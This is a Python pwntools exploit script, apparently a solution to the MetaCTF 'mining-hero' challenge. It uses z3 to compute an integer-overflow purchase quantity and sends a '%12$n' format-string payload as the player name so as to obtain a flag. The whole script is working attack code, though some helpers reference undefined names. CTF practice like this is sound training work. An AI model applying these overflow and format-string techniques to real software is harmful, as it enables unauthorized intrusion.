from pwn import *
from z3 import *

# --- Info ---
# CTF: MetaCTF
# Date: *
# Challenge: mining-hero
# Description: Integer overflow and format strings to get the flag in an impossible-to-win game
# --- End Info ---

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]

HOST = 'host1.metaproblems.com'
PORT = 5950
PATH = './text-game'

god_money = 1000000000000000

REMOTE = 0

libc = ELF('./libc-2.28.so')
binary = ELF('./text-game')

if(REMOTE):
    r = remote(HOST, PORT)
else:
    r = process(['./ld-2.28.so',PATH], env={'LD_PRELOAD':'./libc-2.28.so'})

def pad(addr):
    return addr + '\x00'*(8-len(addr))
    
def welcome(name):
    r.recvuntil('your name?\n')
    r.sendline(name)

def bet(quantity):
    r.recvuntil('continue...\n')
    r.sendline('1')
    r.recvuntil('or cancel\n')

    r.sendline('heads')

    data = r.recvuntil('.\n')

    r.sendline(str(int(quantity)))

    x = r.recvuntil('\n')
    if ('lost' in x) and sf:
        return False
    elif ('lost' in x) or 'just got' in x:
        return True

def mine():
    r.recvuntil('continue...\n')
    r.sendline('2')
    r.recvuntil('.\n')
    r.recvuntil('\n')
    
def buy(product, quantity):
    r.recvuntil('continue...\n')
    r.sendline('3')
    r.recvuntil('or cancel\n')
    r.sendline(product)
    r.recvuntil('\n')
    r.sendline(str(int(quantity)))
    x = r.recvuntil('Your')
    #print(x)
    return (
        False
        if ('don\'t have' in x)
        else (x.split('flag!\n'))[1].split('\n')[0]
    )

def close():
    r.recvuntil('continue...\n')
    r.sendline('4')
    r.close()
    
def get_quantity():
    data = r.recvuntil('Your options')
    money = (data.split('funds: $'))[1].split('\n')[0]
    if (int(money) >= god_money) and (buy_flag()):
        r.interactive()

fmtstr_payload = '' + 'AAAA%12$n'
welcome(fmtstr_payload)

log.info('Calculating integer overflow number...')

s = Solver()

item_cost = BitVec('item_cost', 64)
total = BitVec('total', 64)
player_funds = BitVec('player_funds', 64)
count = BitVec('count', 64)

s.add(player_funds == 150)
s.add(item_cost == god_money)
s.add(total < player_funds)
s.add(count < 0)
s.add(total == item_cost * count)

s.check()

output = str(s.model())

integer_overflow_n = (output.split('count = '))[1].split(',')[0]
log.info(f'Integer overflow number: {str(integer_overflow_n)}')

log.info('Triggering integer overflow and format string...')

flag = buy('shout-out-from-literally-god', integer_overflow_n)

if(not flag):
    log.failure('Error! Could not get flag')

log.success(f'Flag: {flag}')

r.close()

